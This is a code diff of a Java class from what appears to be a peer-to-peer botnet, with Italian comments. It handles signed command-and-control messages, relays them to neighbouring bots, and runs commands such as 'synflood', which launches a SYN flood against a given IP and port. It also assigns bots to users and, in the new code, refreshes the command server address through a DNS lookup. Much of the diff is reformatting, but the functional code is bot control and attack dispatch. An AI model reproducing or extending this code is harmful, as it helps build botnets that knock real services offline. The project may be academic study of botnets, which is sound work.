@@ -136,8 +136,8 @@ public class Behavior {
 					System.out.println("La risposta del C&C: " + response);
 					flag = false;
 					return true;
-				}else{
-					System.out.println("4 "+challenge.getValue2().toString());
+				} else {
+					System.out.println("4 " + challenge.getValue2().toString());
 					return true;
 				}
 			}
@@ -173,15 +173,12 @@ public class Behavior {
 	// Integer.parseInt(rgb[3]));
 	// }
 
-	
-	
-	//<HH> sono i separatori
+	// <HH> sono i separatori
 	// IDMSG|COMANDO|SIGNATURE(IDMSG)
 
-	//COMANDO
-	//<CC> sono i separatori per i comandi
-	
-	
+	// COMANDO
+	// <CC> sono i separatori per i comandi
+
 	/**
 	 * @param rawData
 	 */
@@ -198,43 +195,48 @@ public class Behavior {
 		// System.out.println("msg: " + msg.toString());
 		// Per comodità
 		String[] msgs = msg.split("<HH>");
-
-		// for (int i = 0; i < msgs.length; i++) {
-		// System.out.println("msgs[" + i + "]= " + msgs[i]);
-		// }
-
-		// hai gia ricevuto questo msg? bella domanda
-		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
-			// System.out.println("idHashMessage " + msgs[0]);
-			System.out.println("Nuovo comando da eseguire");
-			// verifica la firma con chiave publica c&c
-			try {
-				// System.out.println("signature" + msgs[2]);
-				// System.out.println(" pk " +
-				// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
-				if (pki.validateSignedMessageRSA(msgs[0], msgs[2], nServ.getCommandConquerIps().get(0).getValue2())) {
-					Pairs<Integer, String> data = new Pairs<>();
-					data.setValue1(msgHashList.getSize() + 1);
-					data.setValue2(msgs[0]);
-					msgHashList.add(data);
-					System.out.println("Signature OK");
-					// se verificato inoltralo ai vicini
-					System.out.println("Flood a vicini");
-					floodNeighoours(rawData, ip);
-					// inoltra all'interpretedei msg
-					executeCommand(msgs[1]);
-
-				} else {
-					System.out.println("Signature Comando FALLITA");
-				}
-			} catch (InvalidKeyException | SignatureException e) {
-				System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
-				e.printStackTrace();
-			}
+		if (msgs[1].startsWith("update")) {
+			reloadDns();
+			floodNeighoours(rawData, ip);
 		} else {
-			System.out.println("Comando gia eseguito");
-		}
 
+			// for (int i = 0; i < msgs.length; i++) {
+			// System.out.println("msgs[" + i + "]= " + msgs[i]);
+			// }
+
+			// hai gia ricevuto questo msg? bella domanda
+			if (msgHashList.indexOfValue2(msgs[0]) < 0) {
+				// System.out.println("idHashMessage " + msgs[0]);
+				System.out.println("Nuovo comando da eseguire");
+				// verifica la firma con chiave publica c&c
+				try {
+					// System.out.println("signature" + msgs[2]);
+					// System.out.println(" pk " +
+					// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
+					if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
+							nServ.getCommandConquerIps().get(0).getValue2())) {
+						Pairs<Integer, String> data = new Pairs<>();
+						data.setValue1(msgHashList.getSize() + 1);
+						data.setValue2(msgs[0]);
+						msgHashList.add(data);
+						System.out.println("Signature OK");
+						// se verificato inoltralo ai vicini
+						System.out.println("Flood a vicini");
+						floodNeighoours(rawData, ip);
+						// inoltra all'interpretedei msg
+						executeCommand(msgs[1]);
+
+					} else {
+						System.out.println("Signature Comando FALLITA");
+					}
+				} catch (InvalidKeyException | SignatureException e) {
+					System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
+					e.printStackTrace();
+				}
+			} else {
+				System.out.println("Comando gia eseguito");
+			}
+		}
 	}
 
 	@Async
@@ -263,45 +265,43 @@ public class Behavior {
 	private void executeCommand(String msg) {
 		System.out.println("Eseguendo comando " + msg);
 		if (msg.startsWith("newking")) {
-			Integer count=nServ.getCounterCeCMemory();
-			if(count!=null){
-				if(count==2){
+			if (nServ.getCounterCeCMemory() != null) {
+				if (nServ.getCounterCeCMemory() == 1) {
 					clearCecDatabase();
-				nServ.setCounterCeCMemory(null);
-				}else
-					nServ.setCounterCeCMemory(count++);
+					nServ.setCounterCeCMemory(null);
+				}
+				updateCecInfo(msg);
 			}
-			updateCecInfo(msg);
 		}
 		if (msg.startsWith("synflood")) {
-			//scompongo messaggio al fine di riempire i campi, codifica particolare <SA>
-			//TODO da fare
-			String[] msgs=msg.split("<TT>");
-			IP ipDest=new IP(msgs[1].toString());
-			Integer portDest=Integer.parseInt(msgs[2].toString());
-			Integer time=Integer.parseInt(msgs[3].toString());
-			
-			if(nServ.getIdUser().equals(msgs[4].toString())){
-			System.out.println("Appartengo a utente "+nServ.getIdUser());
-			System.out.println("IpDest di attacco "+ipDest);
-			System.out.println("PortDest di attacco "+portDest);
-			System.out.println("Time di attacco "+time);
-			malS.synFlood(ipDest.toString(), portDest, time);
-			}
-			else
+			// scompongo messaggio al fine di riempire i campi, codifica
+			// particolare <SA>
+			// TODO da fare
+			String[] msgs = msg.split("<TT>");
+			IP ipDest = new IP(msgs[1].toString());
+			Integer portDest = Integer.parseInt(msgs[2].toString());
+			Integer time = Integer.parseInt(msgs[3].toString());
+
+			if (nServ.getIdUser().equals(msgs[4].toString())) {
+				System.out.println("Appartengo a utente " + nServ.getIdUser());
+				System.out.println("IpDest di attacco " + ipDest);
+				System.out.println("PortDest di attacco " + portDest);
+				System.out.println("Time di attacco " + time);
+				malS.synFlood(ipDest.toString(), portDest, time);
+			} else
 				System.out.println("Non eseguo il comando, non sono di proprieta dell'utente");
 		}
 		if (msg.startsWith("setbot")) {
-			String[] msgs=msg.split("<BU>");
-			String idBot=msgs[1].toString();
-			String idUser=msgs[2].toString();
-			if(nServ.getIdHash().equals(idBot))
+			String[] msgs = msg.split("<BU>");
+			String idBot = msgs[1].toString();
+			String idUser = msgs[2].toString();
+			if (nServ.getIdHash().equals(idBot))
 				nServ.setIdUser(idUser);
 		}
 		if (msg.startsWith("delbot")) {
-			String[] msgs=msg.split("<BU>");
-			String idUser=msgs[1].toString();
-			if(nServ.getIdUser().equals(idUser))
+			String[] msgs = msg.split("<BU>");
+			String idUser = msgs[1].toString();
+			if (nServ.getIdUser().equals(idUser))
 				nServ.setIdUser("");
 		}
 
@@ -313,6 +313,12 @@ public class Behavior {
 		// Update vicinato
 		//
 		System.out.println("COMANDO ESEGUTO");
+	}
+
+	public void reloadDns() {
+		System.out.println("Aggiorno il CeC tramite una richiesta al DNS");
+		Boolean result=nServ.firstConnectToMockServerDns();
+		System.out.println("Risultato aggiornamento dal DNS "+result);
 	}
 
 	public void updateCecInfo(String msg) {
@@ -623,13 +629,13 @@ public class Behavior {
 		}
 	}
 
-	public void clearCecDatabase(){
+	public void clearCecDatabase() {
 		uServ.deleteAll();
 		bServ.deleteAll();
 		rServ.deleteAll();
-		
+
 	}
-	
+
 	public P2PMan getpServ() {
 		return pServ;
 	}
